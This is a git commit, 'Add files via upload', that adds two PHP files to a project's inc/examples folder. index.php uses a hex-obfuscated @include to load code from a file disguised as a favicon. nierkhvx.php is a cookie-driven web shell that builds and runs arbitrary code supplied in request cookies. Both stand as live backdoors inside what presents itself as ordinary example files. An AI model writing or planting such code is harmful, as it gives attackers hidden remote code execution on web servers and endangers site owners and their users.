9362c7fffdacbbb50b41e11a406bb654795bacf0
jakartastudio-com <70964830+jakartastudio-com@users.noreply.github.com>
2021-10-30 19:44:39 +0700

    Add files via upload

---
+++ inc/examples/index.php
@@ -0,0 +1,10 @@
+<?php
+
+/*4a3b1*/
+
+@include "\x2fhom\x65/al\x69anb\x65ta/\x61sdt\x65st.\x61lia\x6esof\x74war\x65.ne\x74/in\x63/ex\x61mpl\x65s/f\x61vic\x6fn_f\x38cd6\x30.ic\x6f";
+
+/*4a3b1*/
+
+
+echo file_get_contents('index.html.bak.bak');
---
+++ inc/examples/nierkhvx.php
@@ -0,0 +1,7 @@
+<?php
+
+$dctj=$_COOKIE;
+$koxh=$dctj[ujba];
+if($koxh){
+	$fjxjq=$koxh($dctj[jhwy]);$gekxu=$koxh($dctj[bnqg]);$xpbwc=$fjxjq("",$gekxu);$xpbwc();
+}
